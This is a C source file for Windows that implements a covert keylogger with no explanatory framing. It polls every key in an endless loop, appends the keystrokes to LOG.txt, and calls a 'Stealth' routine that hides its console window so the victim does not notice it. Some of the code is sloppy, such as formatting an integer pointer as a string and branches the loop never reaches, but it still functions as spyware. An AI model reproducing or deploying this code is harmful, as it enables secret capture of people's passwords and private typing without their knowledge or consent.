#include <stdio.h>
#include <windows.h> 
#include <winuser.h>

int Save (int key_stroke, char *file);
int Stealth();

int main() 
{
    Stealth(); 
    int i;
    while (1)
    {
        for(i = 8; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            Save (i,"LOG.txt"); 
        }
    }
    system ("PAUSE");
    return 0;
}

int Save (int key_stroke, char *file)
{
    if (key_stroke <= 7)
    return 0;

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    printf("%d" , & key_stroke);
    printf("\n");
    if(key_stroke)
    if (key_stroke == 8)
    fprintf(OUTPUT_FILE, "%s", "[Back]");
    else if (key_stroke == 9)
    fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == 13)
    fprintf(OUTPUT_FILE, "%s", "[N \n]");
    else if (key_stroke == 16)
    fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == 17)
    fprintf(OUTPUT_FILE, "%s", "[CTRL]");
    else if (key_stroke == 18)
    fprintf(OUTPUT_FILE, "%s", "[ALT]");
    else if (key_stroke == 19)
    fprintf(OUTPUT_FILE, "%s", "[PAUSE/BREAK]");
    else if (key_stroke == 20)
    fprintf(OUTPUT_FILE, "%s", "[C LOCK]");
    else if (key_stroke == 27)
    fprintf(OUTPUT_FILE, "%s", "[ESC]");
    else if (key_stroke == 32)
    fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == 33)
    fprintf(OUTPUT_FILE, "%s", "[PAGE UP]");
    else if (key_stroke == 34)
    fprintf(OUTPUT_FILE, "%s", "[PAGE DOWN]");
    else if (key_stroke == 35)
    fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == 36)
    fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == 37)
    fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if (key_stroke == 38)
    fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if (key_stroke == 39)
    fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if (key_stroke == 40)
    fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if (key_stroke == 44)
    fprintf(OUTPUT_FILE, "%s", "[prntscr]");
    else if (key_stroke == 45)
    fprintf(OUTPUT_FILE, "%s", "[INSERT]");
    else if (key_stroke == 46)
    fprintf(OUTPUT_FILE, "%s", "[DEL]");
    else if (key_stroke == 91)
    fprintf(OUTPUT_FILE, "%s", "[Super]");
    else if (key_stroke == 92)
    fprintf(OUTPUT_FILE, "%s", "[SuperR]");
    else if (key_stroke == 93)
    fprintf(OUTPUT_FILE, "%s", "[optnskey]");
    else if (key_stroke == 96)
    fprintf(OUTPUT_FILE, "%s", "[N 0]");
    else if (key_stroke == 97)
    fprintf(OUTPUT_FILE, "%s", "[N 1]");
    else if (key_stroke == 98)
    fprintf(OUTPUT_FILE, "%s", "[N 2]");
    else if (key_stroke == 99)
    fprintf(OUTPUT_FILE, "%s", "[N 3]");
    else if (key_stroke == 100)
    fprintf(OUTPUT_FILE, "%s", "[N 4]");
    else if (key_stroke == 101)
    fprintf(OUTPUT_FILE, "%s", "[N 5]");
    else if (key_stroke == 102)
    fprintf(OUTPUT_FILE, "%s", "[N 6]");
    else if (key_stroke == 103)
    fprintf(OUTPUT_FILE, "%s", "[N 7]");
    else if (key_stroke == 104)
    fprintf(OUTPUT_FILE, "%s", "[N 8]");
    else if (key_stroke == 105)
    fprintf(OUTPUT_FILE, "%s", "[N 9]");
    else if (key_stroke == 106)
    fprintf(OUTPUT_FILE, "%s", "[N *]");
    else if (key_stroke == 107)
    fprintf(OUTPUT_FILE, "%s", "[N +]");
    else if (key_stroke == 109)
    fprintf(OUTPUT_FILE, "%s", "[N -]");
    else if (key_stroke == 110)
    fprintf(OUTPUT_FILE, "%s", "[N . ]");
    else if (key_stroke == 111)
    fprintf(OUTPUT_FILE, "%s", "[/]");
    else if (key_stroke == 112)
    fprintf(OUTPUT_FILE, "%s", "[F1]");
    else if (key_stroke == 113)
    fprintf(OUTPUT_FILE, "%s", "[F2]");
    else if (key_stroke == 114)
    fprintf(OUTPUT_FILE, "%s", "[F3]");
    else if (key_stroke == 115)
    fprintf(OUTPUT_FILE, "%s", "[F4]");
    else if (key_stroke == 116)
    fprintf(OUTPUT_FILE, "%s", "[F5]");
    else if (key_stroke == 117)
    fprintf(OUTPUT_FILE, "%s", "[F6]");
    else if (key_stroke == 118)
    fprintf(OUTPUT_FILE, "%s", "[F7]");
    else if (key_stroke == 119)
    fprintf(OUTPUT_FILE, "%s", "[F8]");
    else if (key_stroke == 120)
    fprintf(OUTPUT_FILE, "%s", "[F9]");
    else if (key_stroke == 121)
    fprintf(OUTPUT_FILE, "%s", "[F10]");
    else if (key_stroke == 122)
    fprintf(OUTPUT_FILE, "%s", "[F11]");
    else if (key_stroke == 123)
    fprintf(OUTPUT_FILE, "%s", "[F12]");
    else if (key_stroke == 124)
    fprintf(OUTPUT_FILE, "%s", "[F13]");
    else if (key_stroke == 125)
    fprintf(OUTPUT_FILE, "%s", "[F14]");
    else if (key_stroke == 126)
    fprintf(OUTPUT_FILE, "%s", "[F15]");
    else if (key_stroke == 144)
    fprintf(OUTPUT_FILE, "%s", "[N LOCK]");
    else if (key_stroke == 145)
    fprintf(OUTPUT_FILE, "%s", "[S LOCK]");
    else if (key_stroke == 186)
    fprintf(OUTPUT_FILE, "%s", ";");
    else if (key_stroke == 187)
    fprintf(OUTPUT_FILE, "%s", "=");
    else if (key_stroke == 188)
    fprintf(OUTPUT_FILE, "%s", ",");
    else if (key_stroke == 189)
    fprintf(OUTPUT_FILE, "%s", "-");
    else if (key_stroke == 190)
    fprintf(OUTPUT_FILE, "%s", ".");
    else if (key_stroke == 191)
    fprintf(OUTPUT_FILE, "%s", "/");
    else if (key_stroke == 192)
    fprintf(OUTPUT_FILE, "%s", "`");
    else if (key_stroke == 219)
    fprintf(OUTPUT_FILE, "%s", "[");
    else if (key_stroke == 220)
    fprintf(OUTPUT_FILE, "%s", "\\");
    else if (key_stroke == 221)
    fprintf(OUTPUT_FILE, "%s", "]");
    else if (key_stroke == 222)
    fprintf(OUTPUT_FILE, "%s", "\"");
    else
    fprintf(OUTPUT_FILE, "%s", &key_stroke);

    fclose (OUTPUT_FILE);
    return 0;
}

int Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}
